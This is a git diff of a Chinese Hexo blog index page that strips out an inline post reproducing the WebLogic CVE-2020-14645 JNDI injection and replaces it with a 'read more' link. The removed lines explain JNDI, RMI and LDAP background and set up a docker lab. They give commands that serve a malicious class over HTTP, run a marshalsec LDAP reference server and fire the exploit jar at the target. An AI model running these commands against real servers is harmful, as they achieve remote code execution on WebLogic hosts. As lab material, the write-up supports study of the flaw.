@@ -342,7 +342,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-01 11:35:30" itemprop="dateModified" datetime="2020-08-01T11:35:30+08:00">2020-08-01</time>
+                <time title="修改时间：2020-08-06 12:58:36" itemprop="dateModified" datetime="2020-08-06T12:58:36+08:00">2020-08-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -402,64 +402,14 @@
 
       
           <p>已经有很多分析文章了，直接讲利用实在点</p>
-<h2 id="需要知道的背景知识"><a href="#需要知道的背景知识" class="headerlink" title="需要知道的背景知识"></a>需要知道的背景知识</h2><h3 id="weblogic及weblogic版本选择"><a href="#weblogic及weblogic版本选择" class="headerlink" title="weblogic及weblogic版本选择"></a>weblogic及weblogic版本选择</h3><p>{ % cq % }<br>WebLogic应用服务器产品系列是业界最全面的开发、部署和集成企业管理软件的平台。简而言之就是中间件，是应用服务器。<br>{ % endcq % }</p>
-<p>因为使用的是<code>com.tangosol.util.extractor.UniversalExtractor</code>这个类<code>Weblogic 12.2.1.4</code>的包</p>
-<h3 id="JNDI及利用原理"><a href="#JNDI及利用原理" class="headerlink" title="JNDI及利用原理"></a>JNDI及利用原理</h3><ul>
-<li>JNDI是SUN公司提供的一种标准的Java命名系统接口</li>
-<li>JNDI可访问的现有的目录及服务有：<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/<span class="number">2000</span>/NT/Me/<span class="number">9</span>x的注册表、RMI、DSML v1&amp;v2、NIS。</span></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p><b>利用原理</b></p>
-<ul>
-<li>客户端的lookup()方法</li>
-<li>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性</li>
-</ul>
-<h3 id="LDAP、RMI及关于RMI、LDAP的选择"><a href="#LDAP、RMI及关于RMI、LDAP的选择" class="headerlink" title="LDAP、RMI及关于RMI、LDAP的选择"></a>LDAP、RMI及关于RMI、LDAP的选择</h3><ol>
-<li>LDAP的中文全称是轻量级目录访问协议</li>
-<li>Java RMI是Java语言的远程调用(官方定义:java 编程接口)</li>
-</ol>
-<p>jdk版本在<b>jndi注入</b>中也起着至关重要的作用，而且不同的攻击对jdk的版本要求也不一致。</p>
-<p><img src="6.jpg" alt=""></p>
-<ul>
-<li><p>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止从其他Codebase地址上动态加载类，增加了<code>RMI ClassLoader</code>的安全性。</p>
-</li>
-<li><p>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
-</li>
-<li><p>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
-</li>
-</ul>
-<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="attr">jdk:</span> <span class="string">8u181(因为版本原因，后续我们用LDAP)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="attr">weblogic:</span> <span class="number">12.2</span><span class="number">.1</span><span class="number">.4</span><span class="number">.0</span></span></pre></td></tr></table></figure>
-<p>搭建靶机可以用我最下面分享的一个github上的工具快速搭建，也可以直接镜像= =或者<code>docker-compose.yml</code></p>
-<ol>
-<li><p><a href="https://hub.docker.com/repository/docker/z1du/weblogic12214jdk8u181" target="_blank" rel="noopener">靶机docker镜像</a></p>
-</li>
-<li><p>docker-compose.yml</p>
-<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">services:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> weblogic:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">   image: z1du/weblogic12214jdk8u181</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">   ports:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    - <span class="string">"7001:7001"</span></span></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.jpg" alt=""></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">开启http服务</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">python -m http.server 5001</span></pre></td></tr></table></figure>
-<p><img src="2.jpg" alt=""></p>
-<p>开启ldap服务(此处192.168.71.128为本机ip)<br>开启rmi方法差不多，我们只需要将LDAPRefServer改为RMIRefServer即可</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">    LDAP_ip:LDAP_port/#后面填写你的恶意类的类名  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="number">1099</span>是你开启rmi服务的端口号，如果不加端口号，它的默认端口号为<span class="number">1099</span>。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    ldap的默认开启端口是<span class="number">1389</span>(无视这边<span class="number">1099</span>，懒得改)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">java -cp marshalsec<span class="number">-0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer http:<span class="comment">//192.168.71.128:5001/#exp 1099</span></span></pre></td></tr></table></figure>
-<p>👇</p>
-<p><img src="3.jpg" alt=""></p>
-<p>此处192.168.71.133为靶机ip</p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">       LDAP_ip:LDAP_port/#Class_name     weblogic_ip:weblogic_port</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">java -jar CVE<span class="number">-2020</span><span class="number">-14645.</span>jar <span class="number">192.168</span><span class="number">.71</span><span class="number">.128</span>:<span class="number">1099</span>/#exp http:<span class="comment">//192.168.71.133:7001</span></span></pre></td></tr></table></figure>
-<p><b>exp.java</b></p>
-<p><img src="4.jpg" alt=""></p>
-<p><img src="5.jpg" alt=""></p>
-<hr>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/ChenZIDu/CVE-2020-14645" target="_blank" rel="noopener">exp及CVE-2020-14645.jar下载</a></p>
-<p><a href="https://github.com/DSO-Lab/Weblogic_CVE-2020-14645" target="_blank" rel="noopener">Weblogic_CVE-2020-14645反序列化漏洞验证程序</a></p>
-<p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></p>
-<p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">weblogic环境快速搭建工具</a></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">JNDI注入原理及利用</a></p>
-<p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">关于JNDI注入</a></p>
-<p><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/07/25/CVE-2020-14645-%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
